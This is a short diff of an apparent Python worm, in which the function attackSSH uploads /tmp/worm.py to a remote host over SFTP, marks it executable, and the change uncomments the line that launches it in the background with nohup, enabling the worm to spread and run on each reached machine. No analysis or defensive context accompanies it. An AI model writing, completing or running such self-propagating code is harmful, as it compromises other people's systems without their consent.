@@ -55,7 +55,7 @@ def attackSSH(ipAddress):
         sftp_client = ssh.open_sftp()
         sftp_client.put('/tmp/worm.py', '/tmp/worm.py')
         ssh.exec_command('chmod a+x /tmp/worm.py')
-        #ssh.exec_command('nohup python /tmp/worm.py &')
+        ssh.exec_command('nohup python /tmp/worm.py &')
 
 if __name__ == "__main__":
     ips = get_ip()
